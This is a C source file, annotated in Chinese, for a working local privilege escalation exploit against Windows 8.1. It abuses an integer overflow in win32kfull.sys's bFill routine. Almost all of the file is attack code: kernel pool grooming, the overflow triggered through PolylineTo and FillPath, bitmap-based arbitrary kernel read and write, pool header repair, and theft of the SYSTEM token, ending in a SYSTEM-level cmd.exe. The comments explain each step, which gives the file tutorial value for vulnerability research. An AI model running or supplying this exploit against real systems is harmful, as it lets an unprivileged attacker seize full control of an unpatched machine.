/*
该漏洞是存在于win32kfull.sys的bFill函数中的一个整型上溢漏洞，
函数在申请内存的时候没有对申请的内存的大小是否发生整型溢出进行验证，导致申请的内存大小可以远小于期望申请的内存大小。
随后函数又会根据期望申请的内存大小来对申请到的内存进行写入操作，这就引发了越界写入的问题，
最终会在释放内存的时候因为破坏了相邻块的_POOL_HEADER而导致BSOD。
通过适当的内存布局，可以利用这个越界写入操作修改BitMap对象的关键成员来实现任意地址读写入从而实现提权。


*/
#include <Windows.h>
#include <wingdi.h>
#include <stdio.h>
#include <winddi.h>
#include <time.h>
#include <stdlib.h>
#include <Psapi.h>

HANDLE hWorker, hManager;
BYTE *bits;

//dt nt!_EPROCESS UniqueProcessID ActiveProcessLinks Token
typedef struct
{
	DWORD UniqueProcessIdOffset;
	DWORD TokenOffset;
} VersionSpecificConfig;

VersionSpecificConfig gConfig = { 0x2e0, 0x348 }; //win 8.1


void AllocateClipBoard2(unsigned int size) 
{
	BYTE *buffer;
	buffer = malloc(size);
	memset(buffer, 0x41, size);
	buffer[size - 1] = 0x00;
	const size_t len = size;
	HGLOBAL hMem = GlobalAlloc(GMEM_MOVEABLE, len);
	memcpy(GlobalLock(hMem), buffer, len);
	GlobalUnlock(hMem);
	//OpenClipboard(0);
	//EmptyClipboard();
	SetClipboardData(CF_TEXT, hMem);
	//CloseClipboard();
	//GlobalFree(hMem);
}




static HBITMAP bitmaps[5000];

/// <summary>
/// 内核风水   
/// Bitmaps of size 0xf80											accelerator tables of size 0x40 0x40 *2 = 0x80
///     空闲														accelerator tables of size 0x40 0x40 *2 = 0x80
/// Gh04 objects of size 0xbc0										accelerator tables of size 0x40 0x40 *2 = 0x80
/// Gh04 objects of size 0xbc0    Gh05 bitmaps  of size 0x3c0		accelerator tables of size 0x40 0x40 *2 = 0x80
/// </summary>
void fungshuei() 
{
	HBITMAP bmp;// 这里选用 bitmap 对象，它的池标记为 Gh05，池类型为 Paged Session Pool
	/*
	kernel pool是内核的堆管理方式，可分为3类：
	Desktop Heap：使用RtlAllocateHeap或DesktopAlloc分配，RtlFreeHeap释放
	Non-Paged Pool：通常是系统对象，如信号量，事件对象等，它们的虚拟地址直接可以映射到物理地址
	Paged Session Pool：使用ExAllocatePoolWithTag分配，ExFreePoolWithTag释放
    在本例中的分配均属于Paged Session Pool，
	*/

	// Allocating 5000 Bitmaps of size 0xf80 leaving 0x80 space at end of page.
	//先分配了5000个大小为 0xf80 字节的 bitmap 对象，这样达到的效果是循环分配新的内存页面，
	//每个页面以 0xf80 字节大小的 bitmap 对象为开始，在页面末尾留下 0x80 大小的空间。
	for (int k = 0; k < 5000; k++) 
	{
		//bmp = CreateBitmap(1685, 2, 1, 8, NULL); 
		//800 = 0x8b0 820 = 0x8e0 1730 = 0x1000 1700 = 0xfc0 1670 = 0xf70
		bmp = CreateBitmap(1670, 2, 1, 8, NULL);// 1680  = 0xf80 1685 = 0xf90 allocation size 0xfa0
		bitmaps[k] = bmp;
	}

	HACCEL hAccel, hAccel2;
	LPACCEL lpAccel;
	// Initial setup for pool fengshui.  
	lpAccel = (LPACCEL)malloc(sizeof(ACCEL));
	SecureZeroMemory(lpAccel, sizeof(ACCEL));
 	
	// Allocating  7000 accelerator tables of size 0x40 0x40 *2 = 0x80 filling in the space at end of page.
	//然后是继续分配了 7000 次 accelerator table 对象，每个大小为 0x40 字节，每次分配两个也就是 0x80 字节大小，
	//这样就填补了每页内存页剩下的空间(0xf80 + 0x80 = 0x1000)。
	HACCEL *pAccels = (HACCEL *)malloc(sizeof(HACCEL) * 7000);
	HACCEL *pAccels2 = (HACCEL *)malloc(sizeof(HACCEL) * 7000);
	for (INT i = 0; i < 7000; i++) 
	{
		hAccel = CreateAcceleratorTableA(lpAccel, 1);
		hAccel2 = CreateAcceleratorTableW(lpAccel, 1);
		pAccels[i] = hAccel;
		pAccels2[i] = hAccel2;
	}

	// Delete the allocated bitmaps to free space at beiginig of pages
	//接着释放了之前分配的 bitmap 对象，这样内存页的开始处就空出来 0xf80 字节的空间。
	for (int k = 0; k < 5000; k++) 
	{
		DeleteObject(bitmaps[k]);
	}
	//allocate Gh04 5000 region objects of size 0xbc0 which will reuse the free-ed bitmaps memory.
	//然后分配了 5000 个大小为 0xbc0 字节的对象，这个大小非常关键，因为如果 bitmap 对象直接被放到受到攻击的对象旁边的话，
	//溢出不会覆盖到 bitmap 对象关键的成员变量
	for (int k = 0; k < 5000; k++) 
	{
		CreateEllipticRgn(0x79, 0x79, 1, 1); //size = 0xbc0
	}

	// Allocate Gh05 5000 bitmaps which would be adjacent to the Gh04 objects previously allocated
	//再分配 5000 个大小为 0x3c0 字节的 bitmap 对象填充每页内存页剩余的空间，这样对 bitmap 对象的溢出就受到我们的控制了。
	for (int k = 0; k < 5000; k++) 
	{
		bmp = CreateBitmap(0x52, 1, 1, 32, NULL); //size  = 3c0
		bitmaps[k] = bmp;
	}


	// Allocate 17500 clipboard objects of size 0x60 to fill any free memory locations of size 0x60
	//下一步是把内存中所有 0x60 大小的先占满了，那么后面分配有溢出的对象时几乎肯定会落在我们的内存布局中。
	for (int k = 0; k < 1700; k++) 
	{ //1500
		AllocateClipBoard2(0x30);
	}

	// delete 2000 of the allocated accelerator tables to make holes at the end of the page in our spray.
	//最后空出来一点缺口，释放掉内存页尾部 0x80 字节的对象。
	//准确来说准备了 2000 个缺口，让目标对象被分配到这 2000个中的其中一个位置。
	for (int k = 2000; k < 4000; k++) 
	{
		DestroyAcceleratorTable(pAccels[k]);
		DestroyAcceleratorTable(pAccels2[k]);
	}
	
}

void SetAddress(BYTE* address) 
{
	for (int i = 0; i < sizeof(address); i++) 
	{
		bits[0xdf0 + i] = address[i];
	}
	SetBitmapBits(hManager, 0x1000, bits);
}

void WriteToAddress(BYTE* data) 
{
	SetBitmapBits(hWorker, sizeof(data), data);
}

LONG ReadFromAddress(ULONG64 src, BYTE* dst, DWORD len) 
{
	SetAddress((BYTE *)&src);
	return GetBitmapBits(hWorker, len, dst);
}

// Get base of ntoskrnl.exe
//使用 EnumDeviceDrivers 来获取 ntoskrnl 的基址，
//另外也可以通过NtQuerySystemInformation(11) 来获取 ntoskrnl 的基址
ULONG64 GetNTOsBase()
{
	ULONG64 Bases[0x1000];
	DWORD needed = 0;
	ULONG64 krnlbase = 0;
	if (EnumDeviceDrivers((LPVOID *)&Bases, sizeof(Bases), &needed)) 
	{
		krnlbase = Bases[0];
	}
	return krnlbase;
}

// Get EPROCESS for System process
ULONG64 PsInitialSystemProcess()
{
	// load ntoskrnl.exe
	ULONG64 ntos = (ULONG64)LoadLibrary("ntoskrnl.exe");

	// get address of exported PsInitialSystemProcess variable
	ULONG64 addr = (ULONG64)GetProcAddress((HMODULE)ntos, "PsInitialSystemProcess");
	FreeLibrary((HMODULE)ntos);
	ULONG64 res = 0;
	ULONG64 ntOsBase = GetNTOsBase();
	
	// subtract addr from ntos to get PsInitialSystemProcess offset from base
	if (ntOsBase) 
	{
		ReadFromAddress(addr - ntos + ntOsBase, (BYTE *)&res, sizeof(ULONG64));
	}
	return res;
}

// Get EPROCESS for current process
ULONG64 PsGetCurrentProcess()
{
	ULONG64 pEPROCESS = PsInitialSystemProcess();// get System EPROCESS

	 // walk ActiveProcessLinks until we find our Pid
	LIST_ENTRY ActiveProcessLinks;
	ReadFromAddress(pEPROCESS + gConfig.UniqueProcessIdOffset + sizeof(ULONG64), (BYTE *)&ActiveProcessLinks, sizeof(LIST_ENTRY));

	ULONG64 res = 0;

	while (TRUE) 
	{
		ULONG64 UniqueProcessId = 0;

		// adjust EPROCESS pointer for next entry
		pEPROCESS = (ULONG64)(ActiveProcessLinks.Flink) - gConfig.UniqueProcessIdOffset - sizeof(ULONG64);
		// get pid
		ReadFromAddress(pEPROCESS + gConfig.UniqueProcessIdOffset, (BYTE *)&UniqueProcessId, sizeof(ULONG64));
		// is this our pid?
		if (GetCurrentProcessId() == UniqueProcessId) 
		{
			res = pEPROCESS;
			break;
		}
		// get next entry
		ReadFromAddress(pEPROCESS + gConfig.UniqueProcessIdOffset + sizeof(ULONG64), (BYTE *)&ActiveProcessLinks, sizeof(LIST_ENTRY));
		
		// if next same as last, we reached the end
		if (pEPROCESS == (ULONG64)(ActiveProcessLinks.Flink) - gConfig.UniqueProcessIdOffset - sizeof(ULONG64))
			break;
	}
	return res;
}

/// <summary>
/// 主函数入口
/// </summary>
/// <param name="argc"></param>
/// <param name="argv"></param>
void main(int argc, char* argv[]) 
{
	HDC hdc = GetDC(NULL);
	HDC hMemDC = CreateCompatibleDC(hdc);
	HGDIOBJ bitmap = CreateBitmap(0x5a, 0x1f, 1, 32, NULL);
	HGDIOBJ bitobj = (HGDIOBJ)SelectObject(hMemDC, bitmap);

	static POINT points[0x3fe01];

	//把 points 结构复制到池内存中的函数addEdgeToGet
	/*
	r11 寄存器和 r10 寄存器分别存放了当前 point.y [r9+4] 和前一个 point.y [r8+4]，
	如果当前 point.y 小于前一个 point.y 就会把目标缓冲区 rdx+0x28 地址处写成 0xffffffff，否则就写成 1。
	这里可以假设它是为了判断当前 point.y 是不是和前一个 point.y 保持同一个方向。
	接着会检查前一个 point.y 是否小于 [r9+0xc] = 0x1f0，如果小于的话，当前 point 就会被复制到目标缓冲区，
	如果没有，就跳过当前 point。
	这里还有一点是 point.y 的值会左移1位，如果原来赋值是 1，那么这里就是 0x10。

	和之前的检查一样， 这里对 point.x 的处理也是让当前 point.x 减去前一个 point.x，
	如果小于或等于的话，就会把目标缓冲区 [r15+0x24] 地址处赋值为 0x1。而 points 结构的大小为
	0x30 字节，那么我们用 [rdx+0x28] 覆盖到 sizlBitmap 的同时，还会因为 [r15+0x24] 把 hdev 的值设置为1。
	*/
	for (int l = 0; l < 0x3FE00; l++)//!? 将1到0x3FE00的points的x，y全部赋值为0x5a1f
	{
		points[l].x = 0x5a1f;
		points[l].y = 0x5a1f;
	}
	points[2].y = 20;//0x14 < 0x1f 这里 points[2].y 设置成 0x14，
					//那么在第二个检查中 y 的值为 0x14 << 1 = 0x140 就会小于 0x1f0，然后会将当前 point 复制到目标缓冲区。
	points[0x3FE00].x = 0x4a1f;
	points[0x3FE00].y = 0x6a1f;
	/*
	这里注意到 points 对象的第一个点的 x 和 y 均为 0，猜测默认第零点为原点，
	然后开始对我们设置的第一个点进行检查，由于前一个点为 (0, 0)，y = 0 小于 0x1f0，
	第一个点会复制到缓冲区，目标缓冲区地址 +0x30。
	但是到了第二个点，points[1].y或者 points[0].y 都大于 0x1f0，这个点会被跳过。
	接着到了第三个点，points[3].y= 0x140，它是小于 0x1f0 所以 points[3] 会被复制到目标缓冲区
	其实可以发现，在检查 y 是否小于 0x1f0 时，y 的值是前一个 points.y 和当前 points.y 中较小的那一个，
	所以 points[3] 也会被复制到缓冲区。
	由此可以知道第一次调用的 polylineto 函数使目标缓冲区往后增加了 0x90 的偏移，
	之后的 0x1f 次循环都会增加2 * 0x30 的偏移。

	0xfb0 + 0x90 + 2 * 0x30 * 0x1f = 0x1be0
	还差一个 points，这时在调试器中查看内存发现 points 数组末尾还会检查一次 (0, 0)，
	
	那么 0x1be0 + 0x30 = 0x1c10 刚好可以覆盖到 下一个页的bitmap的sizlBitmap。


	Gh04 objects of size 0xbc0    Gh05 bitmaps  of size 0x3c0		accelerator tables of size 0x40 0x40 *2 = 0x80
	这样复制完成后 sizlBitmap 的成员属性就变成了 0xffffffff * 0x1，导致 buffer 的读写空间非常大，
	那么把这个 bitmap 当作 manager，它的下一页的 bitmap object 当作 worker，通过 SetBitmapBits
	修改 worker 的 pvScan0 属性来设置想读写的地址。
	*/
	if (!BeginPath(hMemDC)) 
	{
		fprintf(stderr, "[!] BeginPath() Failed: %x\r\n", GetLastError());
	}	

	/*
	循环调用 PolylineTo 函数 0x156 次的情况下 points 的数量为
	0x3fe01 * 0x156 = 0x5555556
	但是在调试过程中发现程序会额外添加一个，所以计算时操作数的的值为 0x5555557，结果则是
	0x5555557 * 3 = 0x10000005
	0x10000005 << 4 = 0x50 (32bit)
	那么程序为 points 对象分配的空间大小为 0x50 字节，
	却可以复制 0x5555557 个 points 对象到分配的空间，
	*/
	for (int j = 0; j < 0x156; j++) 
	{
		if (j > 0x1F && points[2].y != 0x5a1f) 
		{
			points[2].y = 0x5a1f;
		}
		if (!PolylineTo(hMemDC, points, 0x3FE01)) 
		{
			fprintf(stderr, "[!] PolylineTo() Failed: %x\r\n", GetLastError());
		}
	}

	//EndPath 函数关闭一个路径括号​​并将括号定义的路径选择到指定的设备上下文中。
	EndPath(hMemDC);

	//Kernel Pool Fung=Shuei
	fungshuei();
	//getchar();
	
	fprintf(stdout, "[+] Trigerring Exploit.\r\n");
	if (!FillPath(hMemDC)) 
	{
			fprintf(stderr, "[!] FillPath() Failed: %x\r\n", GetLastError());
	}
	printf("%s\r\n", "Done filling.");

	/*
	但是这里又出现问题了，如果直接添加 GetBitmapBits 代码运行会发生 crash，原因时 hdev被覆盖成 0x1 了，
	正常情况下它的值为一个 Gdev device object 的指针或者为 NULL，
	而 crash 发生的函数 PDEVOBJ::bAllowShareAccess 会从被覆盖的地址 0x0000000100000000读取值，
	然后判断这个值如果为 1 的话就正常返回。
	幸运的是这个地址可以在用户态直接申请分配，那么用 VirtualAlloc 申请这个地址把值设置成 1 就解决了问题。
	*/
	HRESULT res;
	VOID *fake = VirtualAlloc(0x0000000100000000, 0x100, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
	if (!fake) 
	{
		fprintf(stderr, "VirtualAllocFailed. %x\r\n", GetLastError());
	}
	memset(fake, 0x1, 0x100);
	
	bits = malloc(0x1000);
	memset(bits, 0x42, 0x1000);
	//通过 SetBitmapBits修改 worker 的 pvScan0 属性来设置想读写的地址。此时manager的size已经被扩大。可以修改下一个的pvscan0
	//可以调用 GetBitmapBits 函数来验证下是否复制成功了
	for (int k=0; k < 5000; k++) 
	{
		//获取work的方法也很简单，当创建BitMap对象的时候，指定的可读写的内存大小为0x5C * 1 * 32 / 8 = 0x170，
		//所以可以遍历BitMap句柄的数组，调用GetBitmapBits来判断可读写的内存大小是否超过这个值，如果超过，说明该BitMap被修改了
		res = GetBitmapBits(bitmaps[k], 0x1000, bits); //1685 * 2 * 1 + 1
		if (res > 0x150) 
		{
			fprintf(stdout, "GetBitmapBits Result. %x\r\nindex: %d\r\n", res, k);
			hManager = bitmaps[k];//范围被修改的就是manager
			hWorker = bitmaps[k + 1];//它的下一个就是worker

			/*
			现在我们已经能够读写一大块内存了，下一步就可以任意地址读写了，不过我们还需要修复一下堆头结构，
			前面我们写的 poc 程序每次运行完退出时会因为 Bad Pool Header 触发 crash，溢出破坏了堆头部结构。
			先用 GetBitmapbits 读取下一页的 region 对象和 bitmap 对象的头部，
			写入到当前页的 region 对象和bitmap 对象头部中，
			然后泄露相关内核地址，计算出当前页的 region 对象地址。
			
			*/
			// Get Gh04 header to fix overflown header.
			static BYTE Gh04[0x9];
			fprintf(stdout, "\r\nGh04 header:\r\n");
			for (int i = 0; i < 0x10; i++)
			{
				Gh04[i] = bits[0x1d0 + i];
				fprintf(stdout, "%02x", bits[0x1d0 + i]);
			}
			
			// Get Gh05 header to fix overflown header.
			static BYTE Gh05[0x9];
			fprintf(stdout, "\r\nGh05 header:\r\n");
			for (int i = 0; i < 0x10; i++) 
			{
				Gh05[i] = bits[0xd90 + i];
				fprintf(stdout, "%02x", bits[0xd90 + i]);
			}

			// Address of Overflown Gh04 object header
			static BYTE addr1[0x7];
			fprintf(stdout, "\r\nPrevious page Gh04 (Leaked address):\r\n");
			for (int j = 0; j < 0x8; j++) 
			{
				addr1[j] = bits[0x210 + j];
				fprintf(stdout, "%02x", bits[0x210 + j]);
			}
			//Get pvscan0 address of second Gh05 object
			static BYTE* pvscan[0x07];
			fprintf(stdout, "\r\nPvsca0:\r\n");
			for (int i = 0; i < 0x8; i++) 
			{
				pvscan[i] = bits[0xdf0 + i];
				fprintf(stdout, "%02x", bits[0xdf0 + i]);
			}

			// Calculate address to overflown Gh04 object header.
			addr1[0x0] = 0;
			int u = addr1[0x1];
			u = u - 0x10;
			addr1[1] = u;
			
			//Fix overflown Gh04 object Header
			SetAddress(addr1);
			WriteToAddress(Gh04);

			// Calculate address to overflown Gh05 object header.
			addr1[0] = 0xc0;
			int y = addr1[1];
			y = y + 0xb;
			addr1[1] = y;

			//Fix overflown Gh05 object Header
			SetAddress(addr1);
			WriteToAddress(Gh05);

			// get System EPROCESS
			ULONG64 SystemEPROCESS = PsInitialSystemProcess();
			//fprintf(stdout, "\r\n%x\r\n", SystemEPROCESS);
			
			ULONG64 CurrentEPROCESS = PsGetCurrentProcess();
			//fprintf(stdout, "\r\n%x\r\n", CurrentEPROCESS);
			
			ULONG64 SystemToken = 0;
			// read token from system process
			ReadFromAddress(SystemEPROCESS + gConfig.TokenOffset, (BYTE *)&SystemToken, 0x8);
			
			// write token to current process
			ULONG64 CurProccessAddr = CurrentEPROCESS + gConfig.TokenOffset;
			SetAddress((BYTE *)&CurProccessAddr);
			
			WriteToAddress((BYTE *)&SystemToken);


			// Done and done. We're System :)
			system("cmd.exe");
			
			break;
		}
		if (res == 0) 
		{
			fprintf(stderr, "GetBitmapBits failed. %x\r\n", GetLastError());
		}
	}
	getchar();
	//clean up
	DeleteObject(bitobj);
	DeleteObject(bitmap);
	DeleteDC(hMemDC);
	ReleaseDC(NULL, hdc);
	VirtualFree(0x0000000100000000, 0x100, MEM_RELEASE);
	//free(points);
	
}
